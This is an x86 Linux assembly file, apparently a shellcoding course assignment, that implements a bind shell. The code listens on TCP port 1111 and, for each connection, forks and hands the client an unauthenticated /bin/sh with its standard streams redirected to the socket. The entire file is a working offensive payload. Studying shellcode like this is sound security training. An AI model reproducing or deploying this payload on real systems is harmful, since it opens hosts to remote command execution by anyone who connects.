; Filename: bindtcp.asm
; Author:   Reuben Sammut
; SLAE ID:  510

global _start

section .text

_start:
	; create socket
	xor eax, eax
	cdq		 ; extend sign of eax to edx (edx = 0)
	mov ebx, eax
	mov al, 0x66 	 ; socketcall
	mov bl, 0x1 	 ; cmd = socket (1)

	push edx 	 ; protocol = 0
	push 0x1 	 ; type = SOCK_STREAM (1)
	push 0x2 	 ; domain = AF_INET (2)
	lea ecx, [esp]
	int 0x80
	mov edi, eax

	; bind
	push edx	 ; sin_zero[4-7]
	push edx	 ; sin_zero[0-3]
	push edx	 ; sin_addr(0.0.0.0)
	push word 0x5704 ; sin_port (1111 = 0x0457)
	push word 0x2	 ; sin_family = AF_INET (2)
	mov ebp, esp
	push 0x10	 ; socklen
	push ebp	 ; addr pointer
	push edi	 ; sockfd
	
	mov al, 0x66	 ; socketcall
	mov bl, 0x2	 ; cmd = bind (2)
	lea ecx, [esp]
	int 0x80

	; listen
	push edx	 ; backlog = 0
	push edi	 ; sockfd
	mov al, 0x66	 ; socketcall
	mov bl, 0x4	 ; cmd = listen (4)
	lea ecx, [esp]
	int 0x80

	; accept
accept:	xor eax, eax
	cdq
	mov ebx, eax
	push edx	 ; len client
	push edx	 ; addr client
	push edi	 ; sockfd
	mov al, 0x66     ; socketcall
	mov bl, 0x5	 ; cmd = accept (5)
	lea ecx, [esp]
	int 0x80
	mov esi, eax	 ; clientfd

	; fork
	mov al, 0x2	 ; fork
	int 0x80
	jnz parent

	;; child
	;; dup2
	mov ecx, edx
	mov cl, 0x2 	 ; start from fd = 2 (stderr) and go down to 0

dup2:	mov al, 0x3F	 ; dup2
	mov ebx, esi	 ; clientfd
	int 0x80
	dec ecx
	jns dup2

	;; execve
	push edx	 ; 
	push 0x68732f6e	 ; 
	push 0x69622f2f  ; "//bin/sh\0"
	mov ebp, esp     ; loc of "//bin/sh\0"
	push edx	 ; NULL
	lea edx, [esp]   ; evp = { NULL }
	push ebp         ; push loc of "//bin/sh\0"
	lea ecx, [esp]	 ; argp = { "//bin/sh\0", NULL }
	mov ebx, ebp     ; //bin/sh\0
	mov al, 0x0b     ; execve
	int 0x80

	;; parent
parent:
	;; waitpid
	xor eax, eax
	mov ecx, eax
	cdq

	mov ebx, esi	; clientfd
	mov al, 0x6	; close
	int 0x80

	xor ebx, ebx	; ebx = 0
	dec ebx		; ebx = -1
	mov al, 0x7     ; waitpid
	int 0x80

	;; go back to accept
	jmp accept

